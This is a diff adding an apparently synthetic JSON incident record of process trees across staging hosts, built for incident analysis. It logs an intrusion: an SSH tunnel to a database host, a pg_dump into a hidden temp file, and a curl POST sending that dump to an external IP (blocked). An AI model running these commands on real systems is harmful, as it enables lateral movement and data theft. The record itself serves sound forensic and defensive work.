@@ -1,0 +1,310 @@
+{
+  "incident_id": "INC-2026-0514-A",
+  "generated_at": "2026-05-14T04:15:00Z",
+  "hosts": {
+    "staging-web-01": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 18847,
+          "ppid": 1,
+          "name": "sshd",
+          "cmd": "/usr/sbin/sshd -D",
+          "user": "root",
+          "start": "2026-05-14T03:47:08Z",
+          "src_ip": "185.220.101.42",
+          "event": "remote_login",
+          "auth_user": "j.holloway"
+        },
+        {
+          "pid": 19100,
+          "ppid": 18847,
+          "name": "bash",
+          "cmd": "bash -i",
+          "user": "j.holloway",
+          "start": "2026-05-14T03:47:12Z"
+        },
+        {
+          "pid": 19200,
+          "ppid": 19100,
+          "name": "ssh",
+          "cmd": "ssh -L 5432:staging-db-04:5432 staging-db-04",
+          "user": "j.holloway",
+          "start": "2026-05-14T03:52:00Z",
+          "lateral_movement": true,
+          "dst_host": "staging-db-04"
+        },
+        {
+          "pid": 19400,
+          "ppid": 19100,
+          "name": "pg_dump",
+          "cmd": "pg_dump -h localhost -p 5432 -U nexus_staging nexus_db -f /tmp/.cache/dump.sql",
+          "user": "j.holloway",
+          "start": "2026-05-14T03:55:30Z",
+          "bytes_written": 4823691264,
+          "staging_event": true
+        },
+        {
+          "pid": 19600,
+          "ppid": 19100,
+          "name": "curl",
+          "cmd": "curl -X POST https://45.61.135.99/upload -F file=@/tmp/.cache/dump.sql",
+          "user": "j.holloway",
+          "start": "2026-05-14T04:01:22Z",
+          "dst_ip": "45.61.135.99",
+          "bytes_attempted": 4823691264,
+          "outcome": "BLOCKED_BY_ACL"
+        }
+      ]
+    },
+    "staging-db-04": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 4521,
+          "ppid": 1,
+          "name": "postgres",
+          "cmd": "postgres: nexus_staging nexus_db 10.100.1.15(59032) idle",
+          "user": "postgres",
+          "start": "2026-05-14T03:52:30Z",
+          "lateral_target": true,
+          "src_ip": "10.100.1.15",
+          "auth_user": "j.holloway"
+        }
+      ]
+    },
+    "staging-svc-46": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 7325,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:38:54Z"
+        },
+        {
+          "pid": 8129,
+          "name": "gunicorn",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:41:03Z"
+        },
+        {
+          "pid": 4357,
+          "name": "celery",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T00:38:31Z"
+        }
+      ]
+    },
+    "staging-svc-83": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 8979,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T00:28:30Z"
+        },
+        {
+          "pid": 3298,
+          "name": "celery",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:36:47Z"
+        }
+      ]
+    },
+    "staging-svc-90": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 6913,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T00:24:52Z"
+        },
+        {
+          "pid": 8888,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:24:52Z"
+        },
+        {
+          "pid": 4206,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:20:08Z"
+        }
+      ]
+    },
+    "staging-svc-21": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 2453,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:38:18Z"
+        },
+        {
+          "pid": 3567,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:20:13Z"
+        },
+        {
+          "pid": 4375,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:13:18Z"
+        },
+        {
+          "pid": 8122,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:20:32Z"
+        }
+      ]
+    },
+    "staging-svc-36": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 8530,
+          "name": "gunicorn",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T03:05:45Z"
+        },
+        {
+          "pid": 3066,
+          "name": "gunicorn",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:28:16Z"
+        },
+        {
+          "pid": 5876,
+          "name": "celery",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:07:57Z"
+        },
+        {
+          "pid": 4721,
+          "name": "gunicorn",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T03:18:15Z"
+        },
+        {
+          "pid": 5600,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:22:19Z"
+        }
+      ]
+    },
+    "staging-svc-55": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 4811,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T02:23:41Z"
+        },
+        {
+          "pid": 9593,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T03:42:45Z"
+        },
+        {
+          "pid": 5806,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T03:26:44Z"
+        },
+        {
+          "pid": 4716,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:26:55Z"
+        },
+        {
+          "pid": 2167,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T00:55:23Z"
+        }
+      ]
+    },
+    "staging-svc-32": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 8776,
+          "name": "nginx",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:57:43Z"
+        },
+        {
+          "pid": 4825,
+          "name": "redis-server",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:01:17Z"
+        }
+      ]
+    },
+    "staging-svc-15": {
+      "os": "Ubuntu 22.04",
+      "processes": [
+        {
+          "pid": 6829,
+          "name": "celery",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:44:17Z"
+        },
+        {
+          "pid": 9767,
+          "name": "gunicorn",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T00:29:11Z"
+        },
+        {
+          "pid": 7921,
+          "name": "celery",
+          "cmd": "normal service process",
+          "user": "www-data",
+          "start": "2026-05-14T01:10:28Z"
+        }
+      ]
+    }
+  },
+  "total_bytes_staged": 4823691264,
+  "data_left_network": false,
+  "egress_blocked": true,
+  "initial_compromise_ts": "2026-05-14T03:47:08Z"
+}
